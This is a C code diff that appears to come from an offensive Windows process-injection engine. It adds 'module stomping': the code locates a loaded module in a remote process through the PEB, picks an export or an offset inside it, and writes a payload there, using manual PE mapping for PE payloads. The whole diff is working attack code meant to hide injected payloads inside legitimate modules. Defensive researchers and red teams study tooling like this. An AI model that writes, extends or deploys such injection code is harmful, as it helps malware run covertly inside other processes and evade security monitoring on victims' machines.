@@ -680,11 +680,78 @@ BOOL EngineExecute(PINJECTION_ENGINE engine,
 {
     printf("[+] Initializing target.\n");
     InitializeTarget(ctx, ctx->allocFlavor);
+
     printf("[+] Initializing resolvers.\n");
     InitializeResolvers(ctx);
 
-    printf("[+] Running allocation.\n");
-    engine->Allocate(ctx, PAGE_READWRITE);
+    //printf("[+] Running allocation.\n");
+    //engine->Allocate(ctx, PAGE_READWRITE);
+
+    // For module stomping, we need to locate an address and set ctx->pRemoteAddress
+    if(ctx->enableStomping) {
+        printf("[*] Module stomping is enabled.\n");
+        printf("[*] Targeting module: %s.\n", ctx->targetModule);    
+        printf("[*] Attempting to locate the module base for %s.\n", ctx->targetModule);
+        LPVOID pPeb = GetPebAddressGeneric(ctx->hProcess);
+        PVOID targetModuleBase = GetModuleBaseManualRemote(ctx->hProcess, pPeb, ctx->targetModule);
+        if (!targetModuleBase) {
+            printf("[ERROR] Failed to locate target module base.\n");
+            CloseHandle(ctx->hProcess);
+            return -1;        
+        }
+
+        printf("[*] Target DLL base located at: : 0x%016llx\n", (ULONG_PTR)targetModuleBase);        
+
+        LPVOID bufferAddress = NULL;
+
+        if(ctx->targetOffset != 0) {
+            if(ctx->targetExport != NULL) {
+                printf("[!] Warning: both a target export and a target offset were provided.\n    Prioritizing the offset value over the export name.\n    Double-check your parameters.\n");
+            }
+            printf("[*] Locating offset address: %ld.\n", ctx->targetOffset);
+            printf("[*] Applying RVA offset 0x%X directly from Image Base\n", ctx->targetOffset);
+            bufferAddress = (LPVOID)((PBYTE)targetModuleBase + ctx->targetOffset);
+        } else if(ctx->targetExport != NULL) {
+            printf("[*] Locating export address: %s.\n", ctx->targetExport);
+            printf("[*] Attempting to locate function: %s\n", ctx->targetExport);
+            bufferAddress = (LPVOID)GetRemoteProcAddressManual(ctx->hProcess, targetModuleBase, ctx->targetExport);  
+            if (bufferAddress == NULL) {
+                printf("[ERROR] Failed to locate target function %s! Error: %lu\n", ctx->targetExport, GetLastError());
+                CloseHandle(ctx->hProcess);
+                return -1;
+            }        
+            printf("[*] Target %s!%s located at: 0x%016llx\n", ctx->targetModule, ctx->targetExport, (ULONG_PTR)bufferAddress);
+            ctx->pRemoteAddress = bufferAddress;
+        } else {                    
+            printf("[*] No export or offset provided, targeting the first exported function.\n");
+            printf("[*] Found target module base at: 0x%p\n", targetModuleBase);
+
+            // 2. Use the base address to find the absolute address of the first export in the .text section
+            PVOID pFirstExport = FindFirstExportInTextSectionGeneric(ctx->hProcess, targetModuleBase);
+
+            if (pFirstExport == NULL) {
+                printf("[-] Failed to find a valid executable export inside the .text section.\n");
+                // Handle error or exit early
+                return FALSE;
+            }
+
+            printf("[+] Successfully located first export entry point at: 0x%p\n", pFirstExport);
+            ctx->pRemoteAddress = pFirstExport; 
+
+            /*
+            // 3. Optional: Calculate the Relative Virtual Address (RVA) if needed for tracking
+            PVOID exportRVA = (DWORD)((BYTE*)pFirstExport - (BYTE*)targetModuleBase);
+            printf("[*] First export RVA: 0x%08X\n", exportRVA);   */
+            
+        }
+    } else {
+        printf("[+] Starting allocation phase.\n");
+        if (!engine->Allocate(ctx, PAGE_READWRITE)) {
+            printf("[!] Error: Allocation failed.\n");
+            return FALSE;
+        } 
+        printf("[+] Space allocated RW at: 0x%p\n", ctx->pRemoteAddress);
+    }
 
     if (IsPayloadPE(pPayload)) {
         printf("[+] Writing payload with ManualMapWrite.\n");
